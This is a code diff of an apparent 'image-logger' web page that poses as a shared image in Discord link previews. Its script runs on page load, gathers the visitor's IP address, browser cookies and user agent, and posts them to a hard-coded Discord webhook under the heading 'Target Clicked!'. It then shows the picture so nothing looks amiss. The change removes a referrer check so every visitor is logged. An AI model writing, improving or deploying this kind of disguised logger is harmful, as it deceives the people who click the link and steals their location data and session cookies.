@@ -5,84 +5,59 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Image</title>
     
-    <!-- CRITICAL: Use the DIRECT image link, not the album link -->
+    <!-- Use the direct Imgur link for Discord Preview -->
     <meta property="og:image" content="https://i.imgur.com/6hLYgA4.png">
     <meta property="og:title" content="Check this out">
-    <meta property="og:description" content="Click to view">
-    <meta property="og:url" content="https://bighunnab-bit.github.io/image-logger/">
-    
-    <!-- Fallback for crawlers that ignore JS -->
-    <img src="https://i.imgur.com/6hLYgA4.png" style="display:none;">
+    <meta property="og:description" content="">
     
     <style>
-        body { margin: 0; padding: 0; background: #2f3136; height: 100vh; }
+        body { margin: 0; padding: 0; background: #2f3136; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        img { max-width: 90vw; max-height: 90vh; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
     </style>
 </head>
 <body>
 
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1572396924575678506/DHAfoB_LoRotUSRW7xM4JoyN-zK-eKZ82BmtXNMdlXb7Mia2eyzNuXPXJev2eM4chhvG";
+    const IMG_SRC = "https://i.imgur.com/6hLYgA4.png"; // Your direct link
 
-    // Log if opened from Discord
-    if (document.referrer.includes("discord.com") || document.referrer.includes("discordapp.com")) {
-        logData();
-    }
-
-    async function logData() {
+    // Run logging immediately
+    (async () => {
         try {
+            // 1. Get IP
             let ip = "Unknown";
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                ip = ipData.ip;
-            } catch (e) {
-                ip = "Could not retrieve IP";
-            }
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                ip = data.ip;
+            } catch (e) {}
 
-            const cookies = document.cookie;
-
-            const payload = {
-                embeds: [{
-                    title: "🕵️‍♂️ Target Clicked!",
-                    color: 15158332, 
-                    fields: [
-                        {
-                            name: "🌐 IP Address",
-                            value: `\`${ip}\``,
-                            inline: true
-                        },
-                        {
-                            name: "🔑 Cookies",
-                            value: `\`\`\`${cookies}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "📅 Time",
-                            value: new Date().toLocaleString(),
-                            inline: false
-                        },
-                        {
-                            name: "💻 User Agent",
-                            value: navigator.userAgent,
-                            inline: false
-                        }
-                    ],
-                    footer: {
-                        text: "Logger"
-                    }
-                }]
-            };
-
+            // 2. Send Data
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🕵️‍♂️ Target Clicked!",
+                        color: 15158332,
+                        fields: [
+                            { name: "🌐 IP", value: `\`${ip}\``, inline: true },
+                            { name: "🔑 Cookies", value: `\`\`\`${document.cookie}\`\`\``, inline: false },
+                            { name: "📅 Time", value: new Date().toLocaleString(), inline: false },
+                            { name: "💻 User Agent", value: navigator.userAgent, inline: false }
+                        ]
+                    }]
+                })
             });
-
-        } catch (error) {
-            console.error("Logging failed:", error);
+        } catch (e) {
+            console.error("Logging failed", e);
+        } finally {
+            // 3. Show Image regardless of success/failure
+            const img = document.createElement('img');
+            img.src = IMG_SRC;
+            document.body.appendChild(img);
         }
-    }
+    })();
 </script>
 
 </body>
